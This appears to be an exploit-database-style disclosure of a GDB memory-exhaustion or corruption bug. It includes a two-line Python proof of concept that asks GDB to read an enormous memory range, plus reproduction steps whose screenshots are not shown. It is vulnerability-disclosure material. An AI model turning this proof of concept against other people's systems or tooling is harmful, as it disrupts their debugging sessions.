## Exploit **GDB 8.1~14.2 memory corruption** 

Google Dork:gdb, memory leak, memory exhausted.

Date: 2024.4.2

Exploit Author: N1nEmAn

Vendor Homepage: https://www.sourceware.org/gdb

Software Link: https://sourceware.org/pub/gdb/releases/

Version: 8.1~14.2  (currently known, and possibly more)

Tested on: Ubuntu18.02、archlinux-2024

## POC

Save as `poc.py` and use `source /path/to/poc.py`.

```py
import gdb
gdb.selected_inferior().read_memory(0, 18446744073709551615)
```

## Vulnerability Reproduction

We exploited this in the newest GDB (14.2), and here are the details of my operating system:

```sh
OS: Arch Linux x86_64
Kernel: 6.8.2-zen2-1-zen
Memory: 9998MiB / 27746MiB
CPU: AMD Ryzen 7 6800H with Radeon Graphics
GPU: AMD ATI Radeon 680M
```

### 1.load any binary file

![image-20240402211432774](./1.png)

### 2.run it and ctrl+c to stop it

![image-20240402211541005](./2.png)

### 3. source poc.py

![image-20240402211613585](./3.png)

![image-20240402212709525](./4.png)

### 4. in Ubuntu

![image-20240402212845142](./5.png)
